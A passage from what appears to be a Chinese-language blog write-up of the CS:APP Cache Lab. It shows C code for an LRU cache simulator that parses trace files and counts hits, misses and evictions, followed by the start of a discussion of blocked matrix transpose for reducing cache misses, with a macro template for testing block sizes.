punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 缓存行</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> valid<span class="token punctuation">;</span>    <span class="token keyword">int</span> tag<span class="token punctuation">;</span>    <span class="token keyword">int</span> last_used<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CacheLine<span class="token punctuation">;</span><span class="token comment">// 缓存组</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    CacheLine <span class="token operator">*</span>lines<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CacheSet<span class="token punctuation">;</span><span class="token comment">// 缓存模拟器</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> E<span class="token punctuation">;</span>    <span class="token keyword">int</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> set_num<span class="token punctuation">;</span>    CacheSet <span class="token operator">*</span>sets<span class="token punctuation">;</span>    <span class="token keyword">int</span> hit_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> miss_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> evict_count<span class="token punctuation">;</span>    <span class="token keyword">int</span> access_count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> Cache<span class="token punctuation">;</span><span class="token comment">// 初始化缓存模拟器</span><span class="token keyword">void</span> <span class="token function">init_cache</span><span class="token punctuation">(</span>Cache <span class="token operator">*</span>cache<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> E<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cache<span class="token operator">-></span>s <span class="token operator">=</span> s<span class="token punctuation">;</span>    cache<span class="token operator">-></span>E <span class="token operator">=</span> E<span class="token punctuation">;</span>    cache<span class="token operator">-></span>b <span class="token operator">=</span> b<span class="token punctuation">;</span>    cache<span class="token operator">-></span>set_num <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">;</span>    cache<span class="token operator">-></span>sets <span class="token operator">=</span> <span class="token punctuation">(</span>CacheSet <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>cache<span class="token operator">-></span>set_num <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CacheSet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>set_num<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lines <span class="token operator">=</span> <span class="token punctuation">(</span>CacheLine <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>E <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CacheLine<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>             cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cache<span class="token operator">-></span>hit_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cache<span class="token operator">-></span>miss_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cache<span class="token operator">-></span>evict_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cache<span class="token operator">-></span>access_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取地址对应组号和tag</span><span class="token keyword">void</span> <span class="token function">get_cache_parts</span><span class="token punctuation">(</span>Cache <span class="token operator">*</span>cache<span class="token punctuation">,</span> <span class="token keyword">int</span> address<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>tag<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">*</span>index <span class="token operator">=</span> <span class="token punctuation">(</span>address <span class="token operator">>></span> cache<span class="token operator">-></span>b<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>cache<span class="token operator">-></span>set_num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>cache<span class="token operator">-></span>s <span class="token operator">+</span> cache<span class="token operator">-></span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 访问指定地址对应的cache组号和tag</span><span class="token keyword">void</span> <span class="token function">access_cache</span><span class="token punctuation">(</span>Cache <span class="token operator">*</span>cache<span class="token punctuation">,</span> <span class="token keyword">int</span> address<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> tag<span class="token punctuation">,</span> index<span class="token punctuation">;</span>    <span class="token function">get_cache_parts</span><span class="token punctuation">(</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tag<span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> isHit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 是否命中</span>    CacheSet <span class="token operator">*</span>set <span class="token operator">=</span> <span class="token operator">&amp;</span>cache<span class="token operator">-></span>sets<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>E<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">==</span> tag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            isHit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token string">" hit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">++</span>cache<span class="token operator">-></span>hit_count<span class="token punctuation">;</span>            set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> cache<span class="token operator">-></span>access_count<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isHit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 未命中</span>        <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token string">" miss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>cache<span class="token operator">-></span>miss_count<span class="token punctuation">;</span>        <span class="token keyword">int</span> lru_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cache<span class="token operator">-></span>E<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// LRU策略选择写入行</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">&lt;</span> set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                lru_index <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token string">" eviction"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">++</span>cache<span class="token operator">-></span>evict_count<span class="token punctuation">;</span>  <span class="token comment">// 行置换</span>        <span class="token punctuation">&#125;</span>        set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>        set<span class="token operator">-></span>lines<span class="token punctuation">[</span>lru_index<span class="token punctuation">]</span><span class="token punctuation">.</span>last_used <span class="token operator">=</span> cache<span class="token operator">-></span>access_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">++</span>cache<span class="token operator">-></span>access_count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: ./csim-ref [-hv] -s &lt;num> -E &lt;num> -b &lt;num> -t &lt;file>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Options:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -h         Print this help message.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -v         Optional verbose flag.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -s &lt;num>   Number of set index bits.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -E &lt;num>   Number of lines per set.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -b &lt;num>   Number of block offset bits.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  -t &lt;file>  Trace file.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Examples:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  linux>  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  linux>  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vflag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> s <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> E <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>trace_file <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment">// 参数定义</span>    <span class="token keyword">struct</span> <span class="token class-name">option</span> long_options<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#123;</span> <span class="token string">"help"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"verbose"</span><span class="token punctuation">,</span> no_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'v'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"set"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'s'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"lines"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'E'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"block"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token string">"trace"</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">'t'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 参数解析</span>    <span class="token keyword">int</span> opt<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>opt <span class="token operator">=</span> <span class="token function">getopt_long</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"hvs:E:b:t:"</span><span class="token punctuation">,</span> long_options<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>opt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token string">'h'</span><span class="token operator">:</span>                <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token operator">:</span>                vflag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token operator">:</span>                s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'E'</span><span class="token operator">:</span>                E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token operator">:</span>                b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token operator">:</span>                trace_file <span class="token operator">=</span> optarg<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                <span class="token function">print_usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    Cache cache<span class="token punctuation">;</span>    <span class="token function">init_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> s<span class="token punctuation">,</span> E<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>trace_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Faild to open file %s\n"</span><span class="token punctuation">,</span> trace_file<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token operator">||</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        line<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>  <span class="token comment">// 去除尾置换行符</span>        <span class="token keyword">char</span> <span class="token operator">*</span>pline <span class="token operator">=</span> line <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment">// 去除前导空格</span>                <span class="token keyword">char</span> operation<span class="token punctuation">;</span>        <span class="token keyword">int</span> address<span class="token punctuation">,</span> size<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>pline<span class="token punctuation">,</span> <span class="token string">" %c %x,%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>operation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Invalid line format: %s\n"</span><span class="token punctuation">,</span> pline<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token function">trace_info</span><span class="token punctuation">(</span>pline<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">access_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>operation <span class="token operator">==</span> <span class="token string">'M'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">access_cache</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cache<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token function">trace_info</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printSummary</span><span class="token punctuation">(</span>cache<span class="token punctuation">.</span>hit_count<span class="token punctuation">,</span> cache<span class="token punctuation">.</span>miss_count<span class="token punctuation">,</span> cache<span class="token punctuation">.</span>evict_count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="Part-B-Optimizing-Matrix-Transpose"><a href="#Part-B-Optimizing-Matrix-Transpose" class="headerlink" title="Part B: Optimizing Matrix Transpose"></a>Part B: Optimizing Matrix Transpose</h1><h2 id="分块优化"><a href="#分块优化" class="headerlink" title="分块优化"></a>分块优化</h2><p>根据实验手册的说明，分块是降低 Cache misses 的有效方法，可以参考<a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">矩阵乘分块优化方法</a>。</p><p>对于朴素二重循环的矩阵转置方法，矩阵 $A$ 的空间局部性较好，但是矩阵 $B$ 的时间局部性和空间局部性都比较差，访问效率很低。而采用分块方法时，矩阵 $A$ 的空间局部性没有太大下降，但是 $B$ 的时间局部性和空间局部性却有了很大的提升。</p><p>因此我先尝试了分块优化方法，问题在于，块大小应该如何选取？为了偷懒（🤭），我利用 C 语言宏编写了一个分块矩阵转置的函数模板，并测试三个测试样例在不同块大小下的 Cache misses 次数。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">DEFINE_BLOCKED_TRANSPOSE</span><span class="token expression"><span class="token punctuation">(</span>R<span class="token punctuation">,</span> C<span class="token punctuation">)</span>                                       </span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">char</span> blocked</span><span class="token punctuation">##</span><span class="token expression">R</span><span class="token punctuation">##</span><span class="token expression">_</span><span class="token punctuation">##</span><span class="token expression">C</span><span class="token punctuation">##</span><span class="token expression">_trans_desc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> </span><span class="token string">"("</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">R </span></span></span><span class="token string">", "</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">C </span></span></span><span class="token string">") Blocked row-wise scan transpose"</span><span class="token expression"><span class="token punctuation">;</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">void</span> blocked</span><span class="token punctuation">##</span><span class="token expression">R</span><span class="token punctuation">##</span><span class="token expression">_</span><span class="token punctuation">##</span><span class="token expression">C</span><span class="token punctuation">##</span><span class="token expression"><span class="token function">_trans</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">,</span> <span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span>       </span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">&#123;</span>                                                                           </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> ii<span class="token punctuation">,</span> jj<span class="token punctuation">,</span> tmp<span class="token punctuation">;</span>                                                  </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">int</span> brsize <span class="token operator">=</span> R<span class="token punctuation">,</span> bcsize <span class="token operator">=</span> C<span class="token punctuation">;</span>                                             </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">int</span> enr <span class="token operator">=</span> brsize <span class="token operator">*</span> <span class="token punctuation">(</span>N <span class="token operator">/</span> brsize<span class="token punctuation">)</span><span class="token punctuation">;</span>                                        </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">int</span> enc <span class="token operator">=</span> bcsize <span class="token operator">*</span> <span class="token punctuation">(</span>M <span class="token operator">/</span> bcsize<span class="token punctuation">)</span><span class="token punctuation">;</span>                                        </span><span class="token punctuation">\</span>                                                                            <span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">for</span> <span class="token punctuation">(</span>ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;=</span> enr<span class="token punctuation">;</span> ii <span class="token operator">+=</span> brsize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                 </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token keyword">for</span> <span class="token punctuation">(</span>jj <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> jj <span class="token operator">&lt;=</span> enc<span class="token punctuation">;</span> jj <span class="token operator">+=</span> bcsize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                             </span><span class="token punctuation">\</span>            <span class="token expression"><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> ii<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span>N <span class="token operator">&lt;</span> ii <span class="token operator">+</span> brsize <span class="token operator">?</span> N <span class="token operator">:</span> ii <span class="token operator">+</span> brsize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    </span><span class="token punctuation">\</span>                <span class="token expression"><span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> jj<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token punctuation">(</span>M <span class="token operator">&lt;</span> jj <span class="token operator">+</span> bcsize <span class="token operator">?</span> M <span class="token operator">:</span> jj <span class="token operator">+</span> bcsize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></span><span class="token punctuation">\</span>                    <span class="token expression">tmp <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                                          </span><span class="token punctuation">\</span>                    <span class="token expression">B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>                                          </span><span class="token punctuation">\</span>                <span class="token expression"><span class="token punctuation">&#125;</span>                                                           </span><span class="token punctuation">\</span>            <span class="token expression"><span class="token punctuation">&#125;</span>                                                               </span><span class="token punctuation">\</span>        <span class="token expression"><span class="token punctuation">&#125;</span>                                                                   </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">&#125;</span>                                                                       </span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">&#125;</span></span></span></code></pre><p>在使用时，只需要将模板“实例化”即可：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">DEFINE_BLOCKED_TRANSPOSE</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> 